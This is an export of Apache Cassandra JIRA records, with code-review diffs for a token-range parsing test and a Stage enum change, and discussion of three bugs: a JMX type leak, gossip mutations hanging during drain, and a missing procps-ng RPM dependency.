+ * regarding copyright ownership.  The ASF licenses this file
+ * to you under the Apache License, Version 2.0 (the
+ * ""License""); you may not use this file except in compliance
+ * with the License.  You may obtain a copy of the License at
+ *
+ *     http://www.apache.org/licenses/LICENSE-2.0
+ *
+ * Unless required by applicable law or agreed to in writing, software
+ * distributed under the License is distributed on an ""AS IS"" BASIS,
+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+ * See the License for the specific language governing permissions and
+ * limitations under the License.
+ */
+package org.apache.cassandra.db;
+
+import java.util.Arrays;
+import java.util.Random;
+import java.util.Set;
+
+import com.google.common.collect.ImmutableSet;
+import org.junit.BeforeClass;
+import org.junit.Test;
+
+import org.apache.cassandra.config.DatabaseDescriptor;
+import org.apache.cassandra.dht.ByteOrderedPartitioner;
+import org.apache.cassandra.dht.IPartitioner;
+import org.apache.cassandra.dht.Murmur3Partitioner;
+import org.apache.cassandra.dht.OrderPreservingPartitioner;
+import org.apache.cassandra.dht.RandomPartitioner;
+import org.apache.cassandra.dht.Range;
+import org.apache.cassandra.dht.Token;
+import org.assertj.core.api.Assertions;
+import org.mockito.Mockito;
+import org.quicktheories.core.Gen;
+import org.quicktheories.impl.Constraint;
+
+import static org.assertj.core.api.Assertions.assertThat;
+import static org.quicktheories.QuickTheory.qt;
+
+public class ColumnFamilyStoreMBeanTest
+{
+    @BeforeClass
+    public static void setup()
+    {
+        // can't use client due to the fact thread pools startup and fail due to config issues
+        DatabaseDescriptor.daemonInitialization();
+    }
+
+    @Test
+    public void testToTokenRangesMurmur3Partitioner()
+    {
+        testToTokenRanges(Murmur3Partitioner.instance);
+    }
+
+    @Test
+    public void testToTokenRangesRandomPartitioner()
+    {
+        testToTokenRanges(RandomPartitioner.instance);
+    }
+
+    @Test
+    public void testToTokenRangesOrderPreservingPartitioner()
+    {
+        testToTokenRanges(OrderPreservingPartitioner.instance);
+    }
+
+    @Test
+    public void testToTokenRangesByteOrderedPartitioner()
+    {
+        testToTokenRanges(ByteOrderedPartitioner.instance);
+    }
+
+    @Test
+    public void testInvalidateTokenRangesFormat()
+    {
+        ColumnFamilyStore store = Mockito.mock(ColumnFamilyStore.class);
+        Mockito.doCallRealMethod().when(store).forceCompactionForTokenRanges(Mockito.any());
+        IPartitioner previous = DatabaseDescriptor.getPartitioner();
+        try
+        {
+            DatabaseDescriptor.setPartitionerUnsafe(ByteOrderedPartitioner.instance);
+
+            for (String s : Arrays.asList(""testing"", ""t1:"", "":t2"", ""spaces should not have an impact""))
+                Assertions.assertThatThrownBy(() -> store.forceCompactionForTokenRanges(s))
+                          .hasMessageStartingWith(String.format(""Unable to parse token range %s;"", s));
+        }
+        finally
+        {
+            DatabaseDescriptor.setPartitionerUnsafe(previous);
+        }
+
+    }
+
+    private static void testToTokenRanges(IPartitioner partitioner)
+    {
+        Token.TokenFactory tokenFactory = partitioner.getTokenFactory();
+        Gen<Token> tokenGen = tokenGen(partitioner);
+        qt().forAll(tokenGen, tokenGen)
+            .checkAssert((left, right) ->
+                         assertThat(ColumnFamilyStore.toTokenRanges(partitioner, toString(tokenFactory, left, right)))
+                         .isEqualTo(ImmutableSet.of(new Range(left, right))));
+    }
+
+    private static String toString(Token.TokenFactory tokenFactory, Token left, Token right)
+    {
+        return tokenFactory.toString(left) + ColumnFamilyStore.TOKEN_DELIMITER + tokenFactory.toString(right);
+    }
+
+    private static Gen<Token> tokenGen(IPartitioner partitioner)
+    {
+        // Random and RandomSource can not share the same seed, but there is a workaround...
+        // use RandomSource to generate a seed!
+        return rs -> partitioner.getRandomToken(new Random(rs.next(Constraint.none())));
+    }
+}

Review Comment:
   Nit: missed newline at end of file



##########
test/unit/org/apache/cassandra/db/ColumnFamilyStoreMBeanTest.java:
##########
@@ -0,0 +1,119 @@
+/*
+ * Licensed to the Apache Software Foundation (ASF) under one
+ * or more contributor license agreements.  See the NOTICE file
+ * distributed with this work for additional information
+ * regarding copyright ownership.  The ASF licenses this file
+ * to you under the Apache License, Version 2.0 (the
+ * ""License""); you may not use this file except in compliance
+ * with the License.  You may obtain a copy of the License at
+ *
+ *     http://www.apache.org/licenses/LICENSE-2.0
+ *
+ * Unless required by applicable law or agreed to in writing, software
+ * distributed under the License is distributed on an ""AS IS"" BASIS,
+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+ * See the License for the specific language governing permissions and
+ * limitations under the License.
+ */
+package org.apache.cassandra.db;
+
+import java.util.Arrays;
+import java.util.Random;
+import java.util.Set;
+
+import com.google.common.collect.ImmutableSet;
+import org.junit.BeforeClass;
+import org.junit.Test;
+
+import org.apache.cassandra.config.DatabaseDescriptor;
+import org.apache.cassandra.dht.ByteOrderedPartitioner;
+import org.apache.cassandra.dht.IPartitioner;
+import org.apache.cassandra.dht.Murmur3Partitioner;
+import org.apache.cassandra.dht.OrderPreservingPartitioner;
+import org.apache.cassandra.dht.RandomPartitioner;
+import org.apache.cassandra.dht.Range;
+import org.apache.cassandra.dht.Token;
+import org.assertj.core.api.Assertions;
+import org.mockito.Mockito;
+import org.quicktheories.core.Gen;
+import org.quicktheories.impl.Constraint;
+
+import static org.assertj.core.api.Assertions.assertThat;
+import static org.quicktheories.QuickTheory.qt;
+
+public class ColumnFamilyStoreMBeanTest
+{
+    @BeforeClass
+    public static void setup()
+    {
+        // can't use client due to the fact thread pools startup and fail due to config issues
+        DatabaseDescriptor.daemonInitialization();
+    }
+
+    @Test
+    public void testToTokenRangesMurmur3Partitioner()
+    {
+        testToTokenRanges(Murmur3Partitioner.instance);
+    }
+
+    @Test
+    public void testToTokenRangesRandomPartitioner()
+    {
+        testToTokenRanges(RandomPartitioner.instance);
+    }
+
+    @Test
+    public void testToTokenRangesOrderPreservingPartitioner()
+    {
+        testToTokenRanges(OrderPreservingPartitioner.instance);
+    }
+
+    @Test
+    public void testToTokenRangesByteOrderedPartitioner()
+    {
+        testToTokenRanges(ByteOrderedPartitioner.instance);
+    }
+
+    @Test
+    public void testInvalidateTokenRangesFormat()
+    {
+        ColumnFamilyStore store = Mockito.mock(ColumnFamilyStore.class);
+        Mockito.doCallRealMethod().when(store).forceCompactionForTokenRanges(Mockito.any());
+        IPartitioner previous = DatabaseDescriptor.getPartitioner();
+        try
+        {
+            DatabaseDescriptor.setPartitionerUnsafe(ByteOrderedPartitioner.instance);
+
+            for (String s : Arrays.asList(""testing"", ""t1:"", "":t2"", ""spaces should not have an impact""))
+                Assertions.assertThatThrownBy(() -> store.forceCompactionForTokenRanges(s))
+                          .hasMessageStartingWith(String.format(""Unable to parse token range %s;"", s));
+        }
+        finally
+        {
+            DatabaseDescriptor.setPartitionerUnsafe(previous);
+        }
+
+    }
+
+    private static void testToTokenRanges(IPartitioner partitioner)
+    {
+        Token.TokenFactory tokenFactory = partitioner.getTokenFactory();
+        Gen<Token> tokenGen = tokenGen(partitioner);
+        qt().forAll(tokenGen, tokenGen)
+            .checkAssert((left, right) ->
+                         assertThat(ColumnFamilyStore.toTokenRanges(partitioner, toString(tokenFactory, left, right)))
+                         .isEqualTo(ImmutableSet.of(new Range(left, right))));

Review Comment:
   ```suggestion
                            .isEqualTo(ImmutableSet.of(new Range<>(left, right))));
   ```



;08/Apr/22 17:11;githubbot;600","smiklosovic closed pull request #1552: CASSANDRA-17527: Clients using JMX are unable to handle non-standard java types but we leak this into our interfaces
URL: https://github.com/apache/cassandra/pull/1552


;08/Apr/22 20:47;githubbot;600",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,12600,,,0,12600,,,,,,,,,,,,,,,,,CASSANDRA-18002,,,,CASSANDRA-17580,CASSANDRA-17638,,,,,,,,,,,,,,,,,,,,,,,,,0.0,dcapwell,,,,,,,,,,,,,,Correctness -> API / Semantic Definition,,,,,,,,Low Hanging Fruit,Workload Replay,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Sat Apr 09 02:31:05 UTC 2022,,,,,,,All,,,,"0|z116t4:",9223372036854775807,,,,adelapena,ifesdjeen,,,Normal,,3.0.0,,https://github.com/apache/cassandra/commit/cf0a231a1d44aa572a299ca18352c7b6a6f2171c,,,,,,,,,new unit test to detect this and trigger failure,,,,,"05/Apr/22 21:34;dcapwell;Marking as fix of 4.1 to note that this has block the release, as several APIs were added to trunk only;;;","06/Apr/22 11:59;ifesdjeen;+1 with Andres's comments;;;","06/Apr/22 14:10;e.dimitrova;We had a discussion with [~dcapwell] last night regarding the exceptions. It seems there is a way to use non-default MBean interceptor to solve all our issues. David came up with the idea. If that doesn't work or it is too much work, changing ConfigurationException to IllegalArgumentException should work (in the new methods suggested). Then we also need to whitelist IllegalArgumentException in the new test too.;;;","06/Apr/22 16:10;dcapwell;As [~e.dimitrova] mentions, not included in this patch is a hack patch I have to solve Cassandra exceptions being thrown from JMX; it uses reflection to modify the MBeanServer so we can fix the exceptions...  Given the fact that reflection is brittle, trying to find a better solution, I feel that hack patch is best for a different JIRA so when ready will create and publish;;;","06/Apr/22 16:27;dcapwell;Going to wait a bit longer to resolve https://github.com/apache/cassandra/pull/1552#discussion_r843777579 as the mailing list hasn't gotten a lot of feedback yet (thanks [~e.dimitrova]); I agree with the comment, just waiting on feedback;;;","07/Apr/22 18:51;dcapwell;pushed feedback about force compaction, its not there using a string format; it could be possible to do a MXBean rather than a MBean and expose a comparable type, but went with the simpler string format of ""toke1:token2"";;;","08/Apr/22 17:15;dcapwell;[~adelapena] approved in PR and Slack;;;","08/Apr/22 17:20;dcapwell;Starting commit

CI Results (pending):
||Branch||Source||Circle CI||Jenkins||
|trunk|[branch|https://github.com/dcapwell/cassandra/tree/commit_remote_branch/CASSANDRA-17527-trunk-355FBBF4-AD29-4FF0-9433-866CA84399B5]|[build|https://app.circleci.com/pipelines/github/dcapwell/cassandra?branch=commit_remote_branch%2FCASSANDRA-17527-trunk-355FBBF4-AD29-4FF0-9433-866CA84399B5]|[build|https://ci-cassandra.apache.org/job/Cassandra-devbranch/1585/]|
;;;","08/Apr/22 20:22;dcapwell;https://app.circleci.com/pipelines/github/dcapwell/cassandra/1337/workflows/48ae2207-68f3-4d67-8d3d-98c2fe009276/jobs/10849 scares me as it was clean (11 expected failures) yesterday... random sample I see they are all having issues with git, so thats outside of Cassandra project and in dtest/ccm domain... so ignoring these failures...;;;","08/Apr/22 20:28;dcapwell;I merged early, https://app.circleci.com/pipelines/github/dcapwell/cassandra/1337/workflows/48ae2207-68f3-4d67-8d3d-98c2fe009276/jobs/10851 hasn't run... I got confused as I saw green summary, but its ""..."" in the middle rather than a checkmark... 

I will monitor to confirm; it was passing in previous runs (see https://app.circleci.com/pipelines/github/dcapwell/cassandra/1331/workflows/7f21cb25-d926-42b7-9f94-c76da361bbb9/jobs/10813) so should be ok;;;","08/Apr/22 20:40;e.dimitrova;My upgrade tests also failed with git issue. I was testing with ccm branch in my repo, restarted and it seems they run now so I am almost sure now we both hit some git problem maybe? 

See here, they are not even marked finished yet but all red:

https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1508/workflows/37edd685-8049-4af7-8099-b47a67aab7c0/jobs/9798;;;","08/Apr/22 20:41;e.dimitrova;This is the restarted run https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra/1508/workflows/bb62e69c-0dc0-4e55-b847-f2b405f87646/jobs/9815/parallel-runs/70?filterBy=ALL;;;","09/Apr/22 02:31;dcapwell;thanks for confirming!

Also, the jvm dtest upgrade tests are now green, so I had a ""clean""-ish CI;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Schema mutations may not be completed on drain,CASSANDRA-17524,13437992,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,jonmeredith,jonmeredith,jonmeredith,05/Apr/22 20:34,27/May/22 19:24,13/Jul/23 08:40,27/Apr/22 18:52,3.0.27,3.11.13,4.0.4,4.1,4.1-alpha1,,Local/Startup and Shutdown,,,,0,,"The drain logic (invoked explicitly with nodetool or from the JVM
shutdown hook) closes down executor stages that can create mutations (counter,
view, mutation) before closing down the commitlog. The gossip
stage also commits schema mutations, and should be treated the same way.

The messaging service is shut down as part of drain, so there should be
no new Gossip messages received, however any messages still queued
in the executor could still run after the commitlog allocator is shut down as
part of drain, causing the gossip stage thread to hang indefinitely waiting
for a new segment that never arrives.

Here is an example from an in-JVM dtest, showing an update to the peers table as it shuts down.
{code:java}
park:-1, Unsafe (jdk.internal.misc)
park:323, LockSupport (java.util.concurrent.locks)
await:289, WaitQueue$Standard$AbstractSignal (org.apache.cassandra.utils.concurrent)
await:282, WaitQueue$Standard$AbstractSignal (org.apache.cassandra.utils.concurrent)
awaitUninterruptibly:186, Awaitable$Defaults (org.apache.cassandra.utils.concurrent)
awaitUninterruptibly:259, Awaitable$AbstractAwaitable (org.apache.cassandra.utils.concurrent)
awaitAvailableSegment:283, AbstractCommitLogSegmentManager (org.apache.cassandra.db.commitlog)
advanceAllocatingFrom:257, AbstractCommitLogSegmentManager (org.apache.cassandra.db.commitlog)
allocate:55, CommitLogSegmentManagerStandard (org.apache.cassandra.db.commitlog)
add:282, CommitLog (org.apache.cassandra.db.commitlog)
beginWrite:50, CassandraKeyspaceWriteHandler (org.apache.cassandra.db)
applyInternal:622, Keyspace (org.apache.cassandra.db)
apply:506, Keyspace (org.apache.cassandra.db)
apply:215, Mutation (org.apache.cassandra.db)
apply:220, Mutation (org.apache.cassandra.db)
apply:229, Mutation (org.apache.cassandra.db)
executeInternalWithoutCondition:644, ModificationStatement (org.apache.cassandra.cql3.statements)
executeLocally:635, ModificationStatement (org.apache.cassandra.cql3.statements)
executeInternal:431, QueryProcessor (org.apache.cassandra.cql3)
updateTokens:804, SystemKeyspace (org.apache.cassandra.db)
updateTokenMetadata:2941, StorageService (org.apache.cassandra.service)
handleStateNormal:3057, StorageService (org.apache.cassandra.service)
onChange:2498, StorageService (org.apache.cassandra.service)
markAsShutdown:607, Gossiper (org.apache.cassandra.gms)
doVerb:39, GossipShutdownVerbHandler (org.apache.cassandra.gms)
lambda$new$0:78, InboundSink (org.apache.cassandra.net)
accept:-1, 581110313 (org.apache.cassandra.net.InboundSink$$Lambda$2638)
accept:64, InboundSink$Filtered (org.apache.cassandra.net)
accept:50, InboundSink$Filtered (org.apache.cassandra.net)
accept:97, InboundSink (org.apache.cassandra.net)
accept:45, InboundSink (org.apache.cassandra.net)
run:433, InboundMessageHandler$ProcessMessage (org.apache.cassandra.net)
run:124, ExecutionFailure$1 (org.apache.cassandra.concurrent)
runWorker:1128, ThreadPoolExecutor (java.util.concurrent)
run:628, ThreadPoolExecutor$Worker (java.util.concurrent)
run:30, FastThreadLocalRunnable (io.netty.util.concurrent)
run:829, Thread (java.lang)
{code}
This causes an exception during shutdown for the in-JVM dtest as it is
unable to shutdown {{{}Stage.GOSSIP{}}}, but does not prevent regular
shutdown for Cassandra as the executors are not stopped. The schema update
would be lost, despite requesting a graceful shutdown.",,jonmeredith,maedhroz,smiklosovic,,,,,,,,,,,,"jonmeredith opened a new pull request, #1559:
URL: https://github.com/apache/cassandra/pull/1559

   See [CASSANDRA-17524](https://issues.apache.org/jira/browse/CASSANDRA-17524)


;08/Apr/22 21:45;githubbot;600","jonmeredith opened a new pull request, #1560:
URL: https://github.com/apache/cassandra/pull/1560

   See [CASSANDRA-17524](https://issues.apache.org/jira/browse/CASSANDRA-17524)


;08/Apr/22 21:46;githubbot;600","jonmeredith opened a new pull request, #1561:
URL: https://github.com/apache/cassandra/pull/1561

   See [CASSANDRA-17524](https://issues.apache.org/jira/browse/CASSANDRA-17524)


;08/Apr/22 22:07;githubbot;600","jonmeredith opened a new pull request, #1562:
URL: https://github.com/apache/cassandra/pull/1562

   See [CASSANDRA-17524](https://issues.apache.org/jira/browse/CASSANDRA-17524)


;08/Apr/22 22:08;githubbot;600","maedhroz commented on code in PR #1559:
URL: https://github.com/apache/cassandra/pull/1559#discussion_r846527053


##########
src/java/org/apache/cassandra/concurrent/Stage.java:
##########
@@ -42,27 +42,34 @@
 
 public enum Stage
 {
-    READ              (""ReadStage"",             ""request"",  DatabaseDescriptor::getConcurrentReaders,        DatabaseDescriptor::setConcurrentReaders,        Stage::multiThreadedLowSignalStage),
-    MUTATION          (""MutationStage"",         ""request"",  DatabaseDescriptor::getConcurrentWriters,        DatabaseDescriptor::setConcurrentWriters,        Stage::multiThreadedLowSignalStage),
-    COUNTER_MUTATION  (""CounterMutationStage"",  ""request"",  DatabaseDescriptor::getConcurrentCounterWriters, DatabaseDescriptor::setConcurrentCounterWriters, Stage::multiThreadedLowSignalStage),
-    VIEW_MUTATION     (""ViewMutationStage"",     ""request"",  DatabaseDescriptor::getConcurrentViewWriters,    DatabaseDescriptor::setConcurrentViewWriters,    Stage::multiThreadedLowSignalStage),
-    GOSSIP            (""GossipStage"",           ""internal"", () -> 1,                                         null,                                            Stage::singleThreadedStage),
-    REQUEST_RESPONSE  (""RequestResponseStage"",  ""request"",  FBUtilities::getAvailableProcessors,             null,                                            Stage::multiThreadedLowSignalStage),
-    ANTI_ENTROPY      (""AntiEntropyStage"",      ""internal"", () -> 1,                                         null,                                            Stage::singleThreadedStage),
-    MIGRATION         (""MigrationStage"",        ""internal"", () -> 1,                                         null,                                            Stage::migrationStage),
-    MISC              (""MiscStage"",             ""internal"", () -> 1,                                         null,                                            Stage::singleThreadedStage),
-    TRACING           (""TracingStage"",          ""internal"", () -> 1,                                         null,                                            Stage::tracingStage),
-    INTERNAL_RESPONSE (""InternalResponseStage"", ""internal"", FBUtilities::getAvailableProcessors,             null,                                            Stage::multiThreadedStage),
-    IMMEDIATE         (""ImmediateStage"",        ""internal"", () -> 0,                                         null,                                            Stage::immediateExecutor),
-    PAXOS_REPAIR      (""PaxosRepairStage"",      ""internal"", FBUtilities::getAvailableProcessors,             null,                                            Stage::multiThreadedStage),
+    READ              (false, ""ReadStage"",             ""request"",  DatabaseDescriptor::getConcurrentReaders,        DatabaseDescriptor::setConcurrentReaders,        Stage::multiThreadedLowSignalStage),
+    MUTATION          (true,  ""MutationStage"",         ""request"",  DatabaseDescriptor::getConcurrentWriters,        DatabaseDescriptor::setConcurrentWriters,        Stage::multiThreadedLowSignalStage),
+    COUNTER_MUTATION  (true,  ""CounterMutationStage"",  ""request"",  DatabaseDescriptor::getConcurrentCounterWriters, DatabaseDescriptor::setConcurrentCounterWriters, Stage::multiThreadedLowSignalStage),
+    VIEW_MUTATION     (true,  ""ViewMutationStage"",     ""request"",  DatabaseDescriptor::getConcurrentViewWriters,    DatabaseDescriptor::setConcurrentViewWriters,    Stage::multiThreadedLowSignalStage),
+    GOSSIP            (true,  ""GossipStage"",           ""internal"", () -> 1,                                         null,                                            Stage::singleThreadedStage),
+    REQUEST_RESPONSE  (false, ""RequestResponseStage"",  ""request"",  FBUtilities::getAvailableProcessors,             null,                                            Stage::multiThreadedLowSignalStage),
+    ANTI_ENTROPY      (false, ""AntiEntropyStage"",      ""internal"", () -> 1,                                         null,                                            Stage::singleThreadedStage),
+    MIGRATION         (false, ""MigrationStage"",        ""internal"", () -> 1,                                         null,                                            Stage::migrationStage),
+    MISC              (false, ""MiscStage"",             ""internal"", () -> 1,                                         null,                                            Stage::singleThreadedStage),
+    TRACING           (false, ""TracingStage"",          ""internal"", () -> 1,                                         null,                                            Stage::tracingStage),
+    INTERNAL_RESPONSE (false, ""InternalResponseStage"", ""internal"", FBUtilities::getAvailableProcessors,             null,                                            Stage::multiThreadedStage),
+    IMMEDIATE         (false, ""ImmediateStage"",        ""internal"", () -> 0,                                         null,                                            Stage::immediateExecutor),
+    PAXOS_REPAIR      (false, ""PaxosRepairStage"",      ""internal"", FBUtilities::getAvailableProcessors,             null,                                            Stage::multiThreadedStage),
     ;
 
     public final String jmxName;
     private final Supplier<ExecutorPlus> executorSupplier;
     private volatile ExecutorPlus executor;
+    /* Set true if this executor should be gracefully shutdown before stopping
+     * the commitlog allocator. Tasks on executors that issue mutations may
+     * block indefinitely waiting for a new commitlog segment, preventing a
+     * clean drain/shutdown.
+     */
+    public final boolean shutdownBeforeCommitlog;

Review Comment:
   nit: Might as well make it a JavaDoc comment?



;08/Apr/22 22:46;githubbot;600","maedhroz commented on code in PR #1559:
URL: https://github.com/apache/cassandra/pull/1559#discussion_r846528079


##########
src/java/org/apache/cassandra/concurrent/Stage.java:
##########
@@ -152,6 +167,18 @@ public static void shutdownNow()
         ExecutorUtils.shutdownNow(executors());
     }
 
+    public static void shutdownAndAwaitMutatingExecutors(boolean interrupt, long timeout, TimeUnit units) throws InterruptedException, TimeoutException
+    {
+        List<ExecutorPlus> executors = mutatingExecutors();
+        ExecutorUtils.shutdown(interrupt, executors);
+        ExecutorUtils.awaitTermination(timeout, units, executors);

Review Comment:
   Does `ExecutorUtils.awaitTermination()` fail all the termination awaits if the very first one times out? I guess that might not be a terrible thing, and we'll at lest have something visibly exploding, but wanted to make sure that was cool.



;08/Apr/22 22:49;githubbot;600","jonmeredith commented on code in PR #1559:
URL: https://github.com/apache/cassandra/pull/1559#discussion_r846533211


##########
src/java/org/apache/cassandra/concurrent/Stage.java:
##########
@@ -152,6 +167,18 @@ public static void shutdownNow()
         ExecutorUtils.shutdownNow(executors());
     }
 
+    public static void shutdownAndAwaitMutatingExecutors(boolean interrupt, long timeout, TimeUnit units) throws InterruptedException, TimeoutException
+    {
+        List<ExecutorPlus> executors = mutatingExecutors();
+        ExecutorUtils.shutdown(interrupt, executors);
+        ExecutorUtils.awaitTermination(timeout, units, executors);

Review Comment:
   Yes, `ExecutorUtils.awaitTermination()` will stop waiting for the other executors as soon as it hits a timeout awaiting. Not an issue in this case, but it is interesting that if there was an exception before waiting for a {{Thread}}, it would never be joined.



;08/Apr/22 23:09;githubbot;600","jonmeredith commented on PR #1561:
URL: https://github.com/apache/cassandra/pull/1561#issuecomment-1111365209

   Merged


;27/Apr/22 18:53;githubbot;600","jonmeredith closed pull request #1561: CASSANDRA-17524 shutdown gossip on drain - 3.0
URL: https://github.com/apache/cassandra/pull/1561


;27/Apr/22 18:53;githubbot;600","jonmeredith commented on PR #1562:
URL: https://github.com/apache/cassandra/pull/1562#issuecomment-1111365352

   Committed.


;27/Apr/22 18:53;githubbot;600","jonmeredith closed pull request #1562: CASSANDRA-17524 shutdown gossip on drain 3.11
URL: https://github.com/apache/cassandra/pull/1562


;27/Apr/22 18:53;githubbot;600","jonmeredith commented on PR #1560:
URL: https://github.com/apache/cassandra/pull/1560#issuecomment-1111365388

   Committed.


;27/Apr/22 18:53;githubbot;600","jonmeredith closed pull request #1560: CASSANDRA-17524 shutdown gossip on drain 4.0
URL: https://github.com/apache/cassandra/pull/1560


;27/Apr/22 18:53;githubbot;600","jonmeredith commented on PR #1559:
URL: https://github.com/apache/cassandra/pull/1559#issuecomment-1111365505

   Committed.


;27/Apr/22 18:53;githubbot;600","jonmeredith closed pull request #1559: CASSANDRA-17524 shutdown gossip on drain trunk
URL: https://github.com/apache/cassandra/pull/1559


;27/Apr/22 18:53;githubbot;600",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,9000,,,0,9000,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,jonmeredith,,,,,,,,,,,,,,Degradation,,,,,,,,Normal,DTest,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Tue Apr 26 16:37:42 UTC 2022,,,,,,,All,,,,"0|z116qw:",9223372036854775807,,,,maedhroz,,,,Low,,3.0.0,,https://github.com/apache/cassandra/commit/651876f5165072a41ab3e40c474500bfa8b73a7a,,,,,,,,,Run existing test suites - adding a ByteBuddy test to get the gossiper thread stuck could be a bit brittle.,,,,,"06/Apr/22 22:47;jonmeredith;While working on the patch, I found that the in-jvm dtests were not intercepting the {{MigrationCoordinator}} uptime function like the {{MigrationManager}}. I've fixed and added a check to make sure that the {{GossiperHelper}} successfully makes sure the schema arrives on the target instance.;;;","08/Apr/22 22:16;jonmeredith;trunk [PR|https://github.com/apache/cassandra/pull/1559] [Branch|https://github.com/jonmeredith/cassandra/tree/C17524-shutdown-gossip-on-drain-trunk] [CircleCI|https://app.circleci.com/pipelines/github/jonmeredith/cassandra?branch=C17524-shutdown-gossip-on-drain-trunk&filter=all]
4.0 [PR|https://github.com/apache/cassandra/pull/1560] [Branch|https://github.com/jonmeredith/cassandra/tree/C17524-shutdown-gossip-on-drain-4.0] [CircleCI|https://app.circleci.com/pipelines/github/jonmeredith/cassandra?branch=C17524-shutdown-gossip-on-drain-4.0&filter=all]
3.11 [PR|https://github.com/apache/cassandra/pull/1562] [Branch|https://github.com/jonmeredith/cassandra/tree/C17524-shutdown-gossip-on-drain-3.11] [CircleCI|https://app.circleci.com/pipelines/github/jonmeredith/cassandra?branch=C17524-shutdown-gossip-on-drain-3.11&filter=all]
3.0 [PR|https://github.com/apache/cassandra/pull/1561] [Branch|https://github.com/jonmeredith/cassandra/tree/C17524-shutdown-gossip-on-drain-3.0] [CircleCI|https://app.circleci.com/pipelines/github/jonmeredith/cassandra?branch=C17524-shutdown-gossip-on-drain-3.0&filter=all]
;;;","08/Apr/22 22:21;jonmeredith;Note for reviewer - I've lowered the maximum drain timeout from a worst case total of 3 hours, down to all executors closing down in a much more reasonable 5 minutes, and made it configurable as a system property in case it causes problems.;;;","08/Apr/22 22:52;maedhroz;+1;;;","09/Apr/22 22:28;smiklosovic;+1 [~jonmeredith], nice catch! I am doing stuff related to draining and executors in CASSANDRA-17493 and I am looking for a reviewer. Would have time to take a look at that, please? ;;;","26/Apr/22 16:37;jonmeredith;Starting commit

CI Results (pending):
||Branch||Source||Circle CI||Jenkins||
|cassandra-3.0|[branch|https://github.com/jonmeredith/cassandra/tree/commit_remote_branch/CASSANDRA-17524-cassandra-3.0-B2CD88DD-CD43-41E1-AC67-692E1D870936]|[build|https://app.circleci.com/pipelines/github/jonmeredith/cassandra?branch=commit_remote_branch%2FCASSANDRA-17524-cassandra-3.0-B2CD88DD-CD43-41E1-AC67-692E1D870936]|[build|https://ci-cassandra.apache.org/job/Cassandra-devbranch/1632/]|
|cassandra-3.11|[branch|https://github.com/jonmeredith/cassandra/tree/commit_remote_branch/CASSANDRA-17524-cassandra-3.11-B2CD88DD-CD43-41E1-AC67-692E1D870936]|[build|https://app.circleci.com/pipelines/github/jonmeredith/cassandra?branch=commit_remote_branch%2FCASSANDRA-17524-cassandra-3.11-B2CD88DD-CD43-41E1-AC67-692E1D870936]|[build|https://ci-cassandra.apache.org/job/Cassandra-devbranch/1633/]|
|cassandra-4.0|[branch|https://github.com/jonmeredith/cassandra/tree/commit_remote_branch/CASSANDRA-17524-cassandra-4.0-B2CD88DD-CD43-41E1-AC67-692E1D870936]|[build|https://app.circleci.com/pipelines/github/jonmeredith/cassandra?branch=commit_remote_branch%2FCASSANDRA-17524-cassandra-4.0-B2CD88DD-CD43-41E1-AC67-692E1D870936]|[build|https://ci-cassandra.apache.org/job/Cassandra-devbranch/1634/]|
|trunk|[branch|https://github.com/jonmeredith/cassandra/tree/commit_remote_branch/CASSANDRA-17524-trunk-B2CD88DD-CD43-41E1-AC67-692E1D870936]|[build|https://app.circleci.com/pipelines/github/jonmeredith/cassandra?branch=commit_remote_branch%2FCASSANDRA-17524-trunk-B2CD88DD-CD43-41E1-AC67-692E1D870936]|[build|https://ci-cassandra.apache.org/job/Cassandra-devbranch/1635/]|;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Official Cassandra packages are missing runtime dependency procps-ng,CASSANDRA-17516,13437453,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,brandon.williams,dylrich,dylrich,02/Apr/22 16:16,27/May/22 19:24,13/Jul/23 08:40,13/Apr/22 12:13,3.0.27,3.11.13,4.0.4,4.1,4.1-alpha1,,Packaging,,,,0,,"Nodetool depends on the free command-line utility, but the official Cassandra RPM does not explicitly install it. free comes from procps-ng, so this package should be made an explicit dependency in the RPM's spec file.

Here's what you get when invoking nodetool without free installed:

bash-5.1# nodetool status
/etc/cassandra/conf/cassandra-env.sh: line 21: free: command not found
expr: syntax error: unexpected argument '2'
expr: syntax error: unexpected argument '2'
/etc/cassandra/conf/cassandra-env.sh: line 59: [: : integer expression expected
/etc/cassandra/conf/cassandra-env.sh: line 63: [: : integer expression expected
/etc/cassandra/conf/cassandra-env.sh: line 67: [: : integer expression expected
expr: syntax error: unexpected argument '4'
/etc/cassandra/conf/cassandra-env.sh: line 81: [: : integer expression expected

